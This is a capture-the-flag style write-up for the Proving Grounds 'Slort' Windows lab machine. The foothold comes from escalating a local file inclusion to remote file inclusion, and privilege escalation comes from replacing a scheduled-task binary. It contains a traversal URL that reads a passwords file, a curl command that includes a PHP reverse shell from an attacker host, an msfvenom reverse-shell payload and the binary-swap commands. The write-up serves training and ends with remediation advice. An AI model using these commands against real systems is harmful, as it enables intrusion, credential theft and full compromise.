# Slort — Proving Grounds

| | |
|---|---|
| **Platform** | Proving Grounds (Practice) |
| **Difficulty** | Easy |
| **OS** | Windows |
| **Status** | ✅ Practice machine, no overlap with the OSCP exam pool |
| **Key techniques** | LFI-to-RFI escalation, PHP reverse shell via remote include, scheduled-task binary replacement |

---

## TL;DR

Slort's web application has a classic `?page=` **Local File Inclusion**
parameter, confirmed by pulling an internal config file straight off disk.
The same parameter accepts a full URL rather than just a local path,
upgrading the bug to **Remote File Inclusion** — a PHP reverse shell hosted
on the attacker's own web server executes directly through the include.
Privilege escalation abuses full write access to a binary invoked by a
recurring scheduled task, swapped for a payload and triggered on its next
run.

---

## Recon & Enumeration

```bash
sudo nmap -sCV -p- <TARGET_IP>
```

Directory brute-forcing on the web root found a `/site` path:

```bash
gobuster dir -u http://<TARGET_IP>:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## Foothold / Initial Access

The application's `page` parameter took a filename directly, and traversal
sequences pulled a file straight off the local disk — a **Local File
Inclusion**:

```
http://<TARGET_IP>:8080/site/index.php?page=../../../../xampp/passwords.txt
```

Testing whether the same parameter would accept a remote URL instead of a
local path confirmed **Remote File Inclusion** was possible too — the
include function wasn't restricting the scheme at all:

```
http://<TARGET_IP>:8080/site/index.php?page=http://<ATTACKER_IP>
```

Hosting a PHP reverse shell (Ivan Sincek's) on a local web server and
pointing the `page` parameter at it executed the shell directly on request:

```bash
curl "http://<TARGET_IP>:8080/site/index.php?page=http://<ATTACKER_IP>/php-reverse-shell.php"
```

```bash
nc -lvnp 4444
```

Shell landed inside the XAMPP web root context. User flag retrieved.

---

## Privilege Escalation

Checking file/folder permissions turned up **Full Access** on
`C:\Backup\TFTP.exe` for the current low-privilege user — and a scheduled
task running that same binary on a short (5-minute) recurring interval.
Full write access to a binary a privileged scheduled task executes is a
direct privilege escalation path: replace the binary, wait for the next
scheduled run.

```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=<ATTACKER_IP> lport=3333 -f exe -o TFTP.exe
```

The original binary was renamed rather than deleted (in case it was locked
by a running instance), and the payload copied into place under the
expected name:

```
move TFTP.EXE TFTP.EXE.BAK
copy C:\Temp\TFTP.EXE TFTP.exe
```

Waiting for the scheduled task's next trigger caught a reverse shell running
as `NT AUTHORITY\SYSTEM`. Root flag retrieved.

---

## Lessons Learned

- **A `page=` style LFI is always worth testing for RFI** by swapping in a
  full URL — if the include function doesn't restrict the scheme, the same
  bug goes from "read local files" to "execute arbitrary remote code"
  directly.
- **Full/modify access to a binary invoked by a scheduled task, running as
  a different (usually higher-privileged) user, is a direct privilege
  escalation path** — no exploit needed, just patience for the next
  scheduled trigger.
- Checking `icacls`-style permissions on binaries referenced by scheduled
  tasks should be a standard step in Windows privesc enumeration, alongside
  service binary permissions.

---

## Remediation

- Whitelist allowed include paths/schemes explicitly (`allow_url_include =
  Off` in PHP, plus application-level path validation); never pass raw user
  input into an include function.
- Restrict write permissions on any binary invoked by a scheduled task to
  the account that owns the task, and audit scheduled tasks for
  overly-permissive file ACLs regularly.

---

**Machine:** [Proving Grounds — Slort](https://portal.offsec.com/labs/play)
